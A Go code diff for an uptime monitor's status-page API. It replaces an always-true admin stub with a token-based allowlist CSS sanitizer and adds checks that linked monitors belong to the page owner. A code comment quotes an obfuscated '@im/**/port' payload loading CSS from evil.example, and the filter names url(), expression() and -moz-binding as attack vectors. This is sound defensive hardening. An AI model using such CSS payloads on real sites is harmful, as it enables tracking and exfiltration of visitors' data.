@@ -2,29 +2,161 @@ package api
 
 import (
 	"encoding/json"
+	"fmt"
 	"net/http"
 	"strconv"
 	"strings"
 	"time"
 
 	"github.com/go-chi/chi/v5"
+	cssscanner "github.com/gorilla/css/scanner"
 	"golang.org/x/crypto/bcrypt"
 	"gorm.io/gorm"
 
 	"github.com/fuomag9/uptime-kabomba/internal/models"
 )
 
-func isAdminUser(userID int) bool {
-	return true
+// allowedAtRules are the only at-rules custom status-page CSS may use.
+// Everything else - known-dangerous (@import, @namespace) or simply unknown
+// - is stripped. Defaulting to deny (rather than blocking a rule blocklist)
+// matters here: an at-keyword the scanner doesn't recognize as one of these
+// is dropped rather than passed through, which is what closes comment-split
+// obfuscation like "@im/**/port \"https://evil.example/x.css\";" - "@im" is
+// not an allowed at-rule, so everything up to the next ";"/"{" (including
+// the reassembled "port" and the string) is discarded with it, rather than
+// individually surviving as "harmless" tokens that reassemble into a working
+// @import once the comment between them is removed.
+var allowedAtRules = map[string]bool{
+	"@media":             true,
+	"@supports":          true,
+	"@font-face":         true,
+	"@keyframes":         true,
+	"@-webkit-keyframes": true,
+	"@-moz-keyframes":    true,
+	"@page":              true,
+	"@container":         true,
+	"@layer":             true,
+	"@property":          true,
+	"@scope":             true,
+	"@starting-style":    true,
 }
 
+// sanitizeCustomCSS tokenizes the provided CSS (rather than pattern-matching
+// on the raw string) and drops constructs that can turn a public status
+// page's custom CSS into an exfiltration or tracking vector: @import and any
+// other non-allowlisted at-rule, url()/url-prefix()/domain() (loads external
+// resources, beaconing the visitor's IP/UA to an attacker-chosen host), and
+// legacy script-execution vectors (expression(), -moz-binding, behavior).
+// Tokenizing - rather than a regex over the raw string - means the filter
+// follows CSS grammar instead of literal text, so comment-splitting tricks
+// like "@im/**/port" can't reassemble into something the checks below would
+// have allowed through individually. Any token that still carries a
+// backslash escape is dropped outright rather than decoded, since legitimate
+// status-page styling never needs escaped identifiers and escapes are the
+// classic way to smuggle a keyword like "url(" past a naive filter.
 func sanitizeCustomCSS(css string) string {
 	if css == "" {
 		return ""
 	}
-	css = strings.ReplaceAll(css, "<", "")
-	css = strings.ReplaceAll(css, ">", "")
-	return css
+
+	s := cssscanner.New(css)
+	var out strings.Builder
+	skipStatement := false
+
+	for {
+		tok := s.Next()
+		if tok.Type == cssscanner.TokenEOF || tok.Type == cssscanner.TokenError {
+			break
+		}
+
+		if strings.Contains(tok.Value, `\`) {
+			continue
+		}
+
+		if skipStatement {
+			if tok.Type == cssscanner.TokenChar && (tok.Value == ";" || tok.Value == "{") {
+				skipStatement = false
+			}
+			continue
+		}
+
+		lower := strings.ToLower(tok.Value)
+
+		switch tok.Type {
+		case cssscanner.TokenComment, cssscanner.TokenCDO, cssscanner.TokenCDC:
+			continue
+		case cssscanner.TokenAtKeyword:
+			if !allowedAtRules[lower] {
+				skipStatement = true
+				continue
+			}
+		case cssscanner.TokenURI:
+			// The whole url(...) - including its contents - is a single
+			// token here; drop it entirely.
+			continue
+		case cssscanner.TokenFunction:
+			name := strings.TrimSuffix(lower, "(")
+			if name == "url" || name == "url-prefix" || name == "domain" || name == "expression" {
+				depth := 1
+				for depth > 0 {
+					t := s.Next()
+					if t.Type == cssscanner.TokenEOF || t.Type == cssscanner.TokenError {
+						break
+					}
+					if t.Type == cssscanner.TokenChar && t.Value == "(" {
+						depth++
+					} else if t.Type == cssscanner.TokenChar && t.Value == ")" {
+						depth--
+					}
+				}
+				continue
+			}
+		case cssscanner.TokenIdent, cssscanner.TokenString:
+			if strings.Contains(lower, "javascript:") || strings.Contains(lower, "expression") ||
+				strings.Contains(lower, "-moz-binding") || strings.Contains(lower, "behavior") {
+				continue
+			}
+		}
+
+		out.WriteString(tok.Value)
+	}
+
+	result := out.String()
+	// Defense in depth against anything the tokenizer pass above missed.
+	result = strings.ReplaceAll(result, "<", "")
+	result = strings.ReplaceAll(result, ">", "")
+	return result
+}
+
+// verifyMonitorOwnership returns an error unless every ID in monitorIDs
+// belongs to userID. Status pages are the only unauthenticated read surface
+// in the app, so letting a caller attach a monitor they don't own would turn
+// one authenticated account into a permanent, unauthenticated, cross-tenant
+// oracle for that monitor's data via the public status page endpoints.
+func verifyMonitorOwnership(db *gorm.DB, monitorIDs []int, userID int) error {
+	if len(monitorIDs) == 0 {
+		return nil
+	}
+
+	unique := make(map[int]struct{}, len(monitorIDs))
+	for _, id := range monitorIDs {
+		unique[id] = struct{}{}
+	}
+	ids := make([]int, 0, len(unique))
+	for id := range unique {
+		ids = append(ids, id)
+	}
+
+	var ownedCount int64
+	if err := db.Model(&models.Monitor{}).
+		Where("id IN ? AND user_id = ?", ids, userID).
+		Count(&ownedCount).Error; err != nil {
+		return fmt.Errorf("failed to verify monitor ownership")
+	}
+	if int(ownedCount) != len(ids) {
+		return fmt.Errorf("one or more monitors not found")
+	}
+	return nil
 }
 
 func hasValidStatusPagePassword(r *http.Request, page *models.StatusPage) bool {
@@ -54,12 +186,6 @@ func HandleGetStatusPages(db *gorm.DB) http.HandlerFunc {
 		if err != nil {
 			http.Error(w, "Failed to fetch status pages", http.StatusInternalServerError)
 			return
-		}
-
-		if !isAdminUser(user.ID) {
-			for i := range pages {
-				pages[i].CustomCSS = ""
-			}
 		}
 
 		w.Header().Set("Content-Type", "application/json")
@@ -97,9 +223,6 @@ func HandleGetStatusPage(db *gorm.DB) http.HandlerFunc {
 			StatusPage: page,
 			Monitors:   monitors,
 		}
-		if !isAdminUser(user.ID) {
-			result.StatusPage.CustomCSS = ""
-		}
 
 		w.Header().Set("Content-Type", "application/json")
 		json.NewEncoder(w).Encode(result)
@@ -128,11 +251,6 @@ func HandleCreateStatusPage(db *gorm.DB) http.HandlerFunc {
 			return
 		}
 
-		if !isAdminUser(user.ID) && req.CustomCSS != "" {
-			http.Error(w, "Custom CSS requires admin access", http.StatusForbidden)
-			return
-		}
-
 		// Validate slug is unique
 		var count int64
 		db.Model(&models.StatusPage{}).
@@ -140,6 +258,15 @@ func HandleCreateStatusPage(db *gorm.DB) http.HandlerFunc {
 			Count(&count)
 		if count > 0 {
 			http.Error(w, "Slug already exists", http.StatusConflict)
+			return
+		}
+
+		// Every monitor_id must belong to the caller - otherwise an
+		// authenticated user could attach (and later, via the unauthenticated
+		// public read endpoints, leak) another tenant's monitor data by
+		// guessing/enumerating monitor IDs.
+		if err := verifyMonitorOwnership(db, req.MonitorIDs, user.ID); err != nil {
+			http.Error(w, err.Error(), http.StatusBadRequest)
 			return
 		}
 
@@ -224,11 +351,6 @@ func HandleUpdateStatusPage(db *gorm.DB) http.HandlerFunc {
 			return
 		}
 
-		if !isAdminUser(user.ID) && req.CustomCSS != "" {
-			http.Error(w, "Custom CSS requires admin access", http.StatusForbidden)
-			return
-		}
-
 		// Verify ownership
 		var count int64
 		db.Model(&models.StatusPage{}).
@@ -248,6 +370,12 @@ func HandleUpdateStatusPage(db *gorm.DB) http.HandlerFunc {
 			return
 		}
 
+		// Every monitor_id must belong to the caller (see HandleCreateStatusPage).
+		if err := verifyMonitorOwnership(db, req.MonitorIDs, user.ID); err != nil {
+			http.Error(w, err.Error(), http.StatusBadRequest)
+			return
+		}
+
 		// Update status page using transaction
 		err := db.Transaction(func(tx *gorm.DB) error {
 			updates := map[string]interface{}{
@@ -257,11 +385,8 @@ func HandleUpdateStatusPage(db *gorm.DB) http.HandlerFunc {
 				"published":       req.Published,
 				"show_powered_by": req.ShowPoweredBy,
 				"theme":           req.Theme,
+				"custom_css":      sanitizeCustomCSS(req.CustomCSS),
 				"updated_at":      time.Now(),
-			}
-
-			if isAdminUser(user.ID) {
-				updates["custom_css"] = sanitizeCustomCSS(req.CustomCSS)
 			}
 
 			if req.Password != "" {
@@ -363,11 +488,9 @@ func HandleGetPublicStatusPage(db *gorm.DB) http.HandlerFunc {
 			return
 		}
 
-		if !isAdminUser(page.UserID) {
-			page.CustomCSS = ""
-		} else {
-			page.CustomCSS = sanitizeCustomCSS(page.CustomCSS)
-		}
+		// Re-sanitize on every read (not just at write time) so any row
+		// written before this sanitizer existed is cleaned up retroactively.
+		page.CustomCSS = sanitizeCustomCSS(page.CustomCSS)
 
 		// Get monitors with their latest heartbeat
 		type StatusHistoryBucket struct {
@@ -380,9 +503,13 @@ func HandleGetPublicStatusPage(db *gorm.DB) http.HandlerFunc {
 			History       []StatusHistoryBucket `json:"history"`
 		}
 
+		// Scope by the page owner as well as the association, so a monitor
+		// that was linked before ownership was enforced at write time (or
+		// whose owner changed since) can never leak through a page it no
+		// longer belongs to.
 		var monitors []models.Monitor
 		db.Joins("INNER JOIN status_page_monitors spm ON monitors.id = spm.monitor_id").
-			Where("spm.status_page_id = ?", page.ID).
+			Where("spm.status_page_id = ? AND monitors.user_id = ?", page.ID, page.UserID).
 			Order("monitors.name ASC").
 			Find(&monitors)
 
@@ -610,10 +737,12 @@ func HandleGetPublicStatusPageHeartbeats(db *gorm.DB) http.HandlerFunc {
 			return
 		}
 
-		// Ensure monitor belongs to page
+		// Ensure the monitor belongs to this page AND is still owned by the
+		// page's owner (see HandleGetPublicStatusPage).
 		var count int64
 		db.Table("status_page_monitors").
-			Where("status_page_id = ? AND monitor_id = ?", page.ID, monitorID).
+			Joins("INNER JOIN monitors ON monitors.id = status_page_monitors.monitor_id").
+			Where("status_page_monitors.status_page_id = ? AND status_page_monitors.monitor_id = ? AND monitors.user_id = ?", page.ID, monitorID, page.UserID).
 			Count(&count)
 		if count == 0 {
 			http.Error(w, "Monitor not found", http.StatusNotFound)
